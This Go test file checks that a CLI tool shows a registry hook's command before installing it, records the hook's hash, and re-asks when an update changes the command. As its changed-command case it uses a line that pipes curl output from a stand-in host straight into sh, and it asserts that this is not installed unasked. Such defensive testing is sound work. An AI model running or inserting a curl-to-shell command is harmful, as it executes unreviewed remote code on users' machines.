package main

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Amitgb14/conch/internal/integration"
)

const testHook = `format = 3
kind = "hook"
name = "warm-cache"
label = "Warm the cache"

[hook]
run = "make warm"
on = ["pr.merged"]
timeout = 120
variables = ["CONCH_BRANCH"]
`

func (r *cliRegistry) publishHook(t *testing.T, src string, version int) {
	t.Helper()
	sum := sha256.Sum256([]byte(src))
	e := integration.Entry{Kind: integration.KindHook, Name: "warm-cache", Label: "Warm the cache", Version: version, Format: 3,
		File: "integrations/warm-cache.toml", SHA256: hex.EncodeToString(sum[:])}
	ix, _ := json.Marshal(integration.Index{Format: 2, Entries: []integration.Entry{e}})
	r.mu.Lock()
	r.files["index.json"] = ix
	r.files[e.File] = []byte(src)
	r.mu.Unlock()
}

// A hook from the registry: its command is shown before it is installed,
// -y or not; it is recorded with its hash; an update that runs something
// else is asked about again even with -y.
func TestIntegrationHookInstallUpdate(t *testing.T) {
	home, stored := integrationEnv(t)
	reg := serveRegistry(t)
	reg.publishHook(t, testHook, 1)

	out, _, err := a4Out(t, func() error { return runIntegration([]string{"install", "warm-cache"}) })
	if err == nil || !strings.Contains(err.Error(), "nothing installed") || !strings.Contains(out, "make warm") {
		t.Fatalf("unanswered: %q %v", out, err)
	}
	path := filepath.Join(home, "integrations", "warm-cache.toml")
	if _, err := os.Stat(path); err == nil {
		t.Fatal("installed without a yes")
	}
	out, _, err = a4Out(t, func() error { return runIntegration([]string{"install", "-y", "warm-cache"}) })
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"Warm the cache runs this on this machine when pr.merged happens", "    make warm", "It reads CONCH_BRANCH",
		"Stopped after 120s", "installed warm-cache 1 (hook) · runs on pr.merged", filepath.Join(home, "hooks", "logs")} {
		if !strings.Contains(out, want) {
			t.Errorf("install said %q, lacking %q", out, want)
		}
	}
	if strings.Contains(out, "key") {
		t.Errorf("a hook has no key to speak of: %q", out)
	}
	if b, _ := os.ReadFile(stored); len(b) > 0 {
		t.Fatalf("the Keychain was given %q", b)
	}
	recs, _ := integration.Records()
	if recs["warm-cache"].SHA256 == "" {
		t.Fatalf("no hash recorded: %+v", recs)
	}
	hooks, _ := integration.Hooks()
	if len(hooks) != 1 || hooks[0].Run != "make warm" {
		t.Fatalf("hooks: %+v", hooks)
	}
	out, _, _ = a4Out(t, func() error { return runIntegration([]string{"ls"}) })
	if !strings.Contains(out, "runs on pr.merged") {
		t.Errorf("ls: %q", out)
	}
	out, _, _ = a4Out(t, func() error { return runIntegration([]string{"info", "warm-cache"}) })
	if !strings.Contains(out, "make warm") || strings.Contains(out, "HTTP only") {
		t.Errorf("info: %q", out)
	}

	// The same command, a new version: -y takes it.
	reg.publishHook(t, testHook+"# v2\n", 2)
	out, _, err = a4Out(t, func() error { return runIntegration([]string{"update", "-y"}) })
	if err != nil || !strings.Contains(out, "warm-cache: updated to 2") {
		t.Fatalf("update: %q %v", out, err)
	}
	// Another command: shown and asked, even with -y; nobody answers.
	reg.publishHook(t, strings.Replace(testHook, "make warm", "curl https://x.dev | sh", 1), 3)
	out, _, err = a4Out(t, func() error { return runIntegration([]string{"update", "-y"}) })
	if err != nil || !strings.Contains(out, "runs something else") || !strings.Contains(out, "curl https://x.dev | sh") || !strings.Contains(out, "warm-cache: not updated") {
		t.Fatalf("changed command: %q %v", out, err)
	}
	if b, _ := os.ReadFile(path); strings.Contains(string(b), "curl") {
		t.Fatal("the new command was installed unasked")
	}
}
